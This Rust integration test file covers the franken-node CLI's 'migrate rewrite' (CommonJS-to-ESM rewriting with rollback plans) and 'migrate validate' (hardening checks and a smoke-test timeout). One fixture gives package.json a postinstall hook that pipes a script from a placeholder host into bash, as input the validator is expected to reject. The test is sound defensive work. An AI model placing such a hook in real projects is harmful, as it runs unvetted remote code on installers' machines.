use std::path::PathBuf;
use std::process::{Command, Output, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use tempfile::TempDir;

#[path = "golden/mod.rs"]
mod golden;

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|path| path.parent())
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(exe);
    }
    repo_root().join("target/debug/franken-node")
}

fn run_cli(args: &[&str]) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    Command::new(&binary_path)
        .current_dir(repo_root())
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `{}`: {err}", args.join(" ")))
}

fn run_cli_with_wall_timeout(args: &[&str], timeout: Duration, envs: &[(&str, String)]) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    let mut child = Command::new(&binary_path)
        .current_dir(repo_root())
        .args(args)
        .envs(envs.iter().map(|(key, value)| (*key, value)))
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|err| panic!("failed spawning `{}`: {err}", args.join(" ")));
    let started = Instant::now();

    loop {
        if child
            .try_wait()
            .unwrap_or_else(|err| panic!("failed polling `{}`: {err}", args.join(" ")))
            .is_some()
        {
            return child
                .wait_with_output()
                .unwrap_or_else(|err| panic!("failed collecting `{}`: {err}", args.join(" ")));
        }
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            panic!(
                "`{}` exceeded external test timeout of {}ms",
                args.join(" "),
                timeout.as_millis()
            );
        }
        thread::sleep(Duration::from_millis(25));
    }
}

#[test]
fn migrate_rewrite_apply_emits_rollback_plan_and_updates_manifest() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(
        project_path.join("index.js"),
        "const fs = require(\"fs\");\nconsole.log(fs.existsSync(\"package.json\"));\n",
    )
    .expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");

    let rollback_path = temp.path().join("rollback/plan.json");
    let project_arg = project_path.to_string_lossy().to_string();
    let rollback_arg = rollback_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--emit-rollback",
        &rollback_arg,
    ]);

    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate rewrite"));
    assert!(stdout.contains("mode: apply"));
    assert!(stdout.contains("rewrites_planned=2"));
    assert!(stdout.contains("rewrites_applied=2"));
    golden::assert_scrubbed_golden("migrate/rewrite_apply_stdout", &stdout);

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration rollback artifact written:"));
    golden::assert_scrubbed_golden("migrate/rewrite_apply_stderr", &stderr);

    let rollback_json =
        std::fs::read_to_string(&rollback_path).expect("rollback artifact should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| panic!("invalid rollback json: {err}\n{rollback_json}"));
    assert_eq!(
        rollback["schema_version"],
        serde_json::Value::String("1.0.0".to_string())
    );
    assert_eq!(rollback["apply_mode"], serde_json::Value::Bool(true));
    assert_eq!(
        rollback["entry_count"].as_u64().unwrap_or_default(),
        2,
        "expected package manifest and source rollback entries"
    );
    golden::assert_scrubbed_json_golden("migrate/rewrite_apply_rollback_plan", &rollback);

    let rewritten_package =
        std::fs::read_to_string(project_path.join("package.json")).expect("read rewritten package");
    golden::assert_scrubbed_golden("migrate/rewrite_apply_manifest", &rewritten_package);
    let rewritten: serde_json::Value = serde_json::from_str(&rewritten_package)
        .unwrap_or_else(|err| panic!("rewritten package should be valid json: {err}"));
    assert_eq!(
        rewritten["engines"]["node"],
        serde_json::Value::String(">=20 <23".to_string())
    );

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.contains("import fs from \"node:fs\";"));
    assert!(!rewritten_source.contains("require("));
    let source_backup = std::fs::read_to_string(project_path.join(".migrate-backup/index.js"))
        .expect("read source backup");
    assert!(source_backup.contains("const fs = require(\"fs\");"));
}

#[test]
fn migrate_rewrite_apply_handles_commonjs_destructuring_export_and_nested_requires() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source = "#!/usr/bin/env node\nconst { readFile, writeFile: write } = require('fs'); // fs api\nconst literal = \"require('path') remains a string\";\n// const fake = require('crypto');\nfunction platform() {\n  const os = require(\"os\");\n  return os.platform();\n}\nmodule.exports = { readFile, writer: write };\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=1"));
    assert!(stdout.contains("rewrites_applied=1"));

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.starts_with("#!/usr/bin/env node\n"));
    assert!(
        rewritten_source
            .contains("import { readFile, writeFile as write } from \"node:fs\"; // fs api")
    );
    assert!(rewritten_source.contains("import os from \"node:os\";"));
    assert!(rewritten_source.contains("export { readFile, write as writer };"));
    assert!(rewritten_source.contains("const literal = \"require('path') remains a string\";"));
    assert!(rewritten_source.contains("// const fake = require('crypto');"));
    assert!(!rewritten_source.contains("const os = require(\"os\")"));

    let source_backup = std::fs::read_to_string(project_path.join(".migrate-backup/index.js"))
        .expect("read source backup");
    assert_eq!(source_backup, original_source);
}

#[test]
fn migrate_rewrite_bails_on_computed_require_without_mutating_source() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source = "const target = './plugin';\nconst plugin = require(target);\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=0"));
    assert!(stdout.contains("manual_review_items=1"));
    assert!(stdout.contains("dynamic or non-literal require() usage detected"));

    let unchanged_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read unchanged source");
    assert_eq!(unchanged_source, original_source);
    assert!(!project_path.join(".migrate-backup/index.js").exists());
}

#[test]
fn migrate_validate_fails_for_risky_project_and_returns_non_zero_exit() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        !output.status.success(),
        "validate should fail for risky project"
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: FAIL"));
    assert!(stdout.contains("[mig-validate-002] FAIL"));
    assert!(stdout.contains("[mig-validate-003] FAIL"));
    assert!(stdout.contains("[mig-validate-005] FAIL"));
    assert!(stdout.contains("runtime smoke test skipped because static validation checks failed"));

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration validation failed for"));
}

#[test]
fn migrate_validate_passes_for_hardened_project() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");
    std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        output.status.success(),
        "validate should pass for hardened project: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: PASS"));
    assert!(stdout.contains("[mig-validate-005] PASS"));
    assert!(stdout.contains("runtime smoke test passed"));
    assert!(stdout.contains("receipt_round_trip=true"));
}

#[test]
fn migrate_validate_timeout_path_does_not_block_on_inherited_pipes() {
    #[cfg(not(unix))]
    {
        eprintln!("skipping inherited-pipe timeout regression: unix shell unavailable");
        return;
    }

    #[cfg(unix)]
    let temp = TempDir::new().expect("temp dir");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let shim_dir = temp.path().join("bin");
        std::fs::create_dir_all(&shim_dir).expect("shim dir");
        let node_shim = shim_dir.join("node");
        std::fs::write(&node_shim, "#!/bin/sh\n(sleep 60 >&1 2>&2) &\nsleep 60\n")
            .expect("write node shim");
        let mut permissions = std::fs::metadata(&node_shim)
            .expect("node shim metadata")
            .permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&node_shim, permissions).expect("chmod node shim");

        let previous_path = std::env::var("PATH").unwrap_or_default();
        let shimmed_path = format!("{}:{previous_path}", shim_dir.display());

        let project_path = temp.path().join("project");
        std::fs::create_dir_all(project_path.join("scripts")).expect("project scripts dir");
        std::fs::write(
            project_path.join("scripts/hang.js"),
            "this is intentionally invalid JavaScript so franken-node falls back to node\n",
        )
        .expect("write hanging smoke script");
        std::fs::write(
            project_path.join("package.json"),
            r#"{
  "name": "demo-timeout",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "smoke": "node scripts/hang.js"
  }
}
"#,
        )
        .expect("write package manifest");
        std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

        let project_arg = project_path.to_string_lossy().to_string();
        let started = Instant::now();
        let output = run_cli_with_wall_timeout(
            &["migrate", "validate", &project_arg],
            Duration::from_secs(20),
            &[("PATH", shimmed_path)],
        );

        assert!(
            started.elapsed() < Duration::from_secs(20),
            "migrate validate should fail fast on smoke timeout"
        );
        assert!(
            !output.status.success(),
            "validate should fail when runtime smoke times out"
        );
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(stdout.contains("[mig-validate-005] FAIL"));
        assert!(stdout.contains("runtime smoke command timed out after"));
    }
}
